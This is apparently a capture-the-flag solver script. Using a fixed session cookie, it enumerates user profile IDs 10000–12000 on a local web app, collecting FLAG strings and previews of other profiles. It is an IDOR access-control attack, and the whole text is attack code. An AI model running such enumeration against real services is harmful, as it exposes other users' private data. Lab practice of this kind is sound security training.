import re

# Configuration
base_url = "http://127.0.0.1:5000"
cookies = {
    'session': 'eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0'
}
flag_pattern = re.compile(r'FLAG\{[^}]+\}')

# Tracking
found_flags = []
valid_profiles = []
anomalous_responses = []

print("[*] Starting enumeration of profile IDs 10000-12000...")

# Iterate through IDs from 10000 to 12000 (inclusive)
for profile_id in range(10000, 12001):
    url = f"{base_url}/profile/{profile_id}"
    
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        
        # Check for FLAG in response
        flag_matches = flag_pattern.findall(response.text)
        if flag_matches:
            for flag in flag_matches:
                print(f"[!] FLAG FOUND at profile ID {profile_id}")
                print(f"[!] Flag: {flag}")
                found_flags.append({
                    'profile_id': profile_id,
                    'flag': flag,
                    'status_code': response.status_code
                })
        
        # Log valid profiles (not 404)
        if response.status_code != 404:
            valid_profiles.append({
                'profile_id': profile_id,
                'status_code': response.status_code,
                'content_length': len(response.text),
                'preview': response.text[:200]  # Short preview of content
            })
            
            # Print anomaly details
            if response.status_code != 200:
                print(f"[?] Anomalous response for profile {profile_id}:")
                print(f"    Status: {response.status_code}")
                print(f"    Length: {len(response.text)}B")
                print(f"    Preview: {response.text[:300]}")
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Error accessing profile {profile_id}: {e}")
    
    # Progress indicator every 500 requests
    if profile_id % 500 == 0:
        print(f"[*] Progress: Completed up to ID {profile_id}")

# Summary
print("\n[*] Enumeration completed!")
print(f"[*] Found {len(valid_profiles)} valid profiles (non-404)")
print(f"[*] Found {len(found_flags)} FLAG values")

if found_flags:
    print("\n[+] Discovered FLAGS:")
    for item in found_flags:
        print(f"[!] Profile ID {item['profile_id']}: {item['flag']}")

print("\n[*] All valid profiles with status != 404:")
for profile in valid_profiles[:20]:  # Show first 20 to avoid overwhelming output
    print(f"[+] Profile {profile['profile_id']}: Status {profile['status_code']}, Length: {profile['content_length']}B")
    print(f"    Preview: {profile['preview']}")

if len(valid_profiles) > 20:
    print(f"\n[+] ... and {len(valid_profiles) - 20} more profiles")
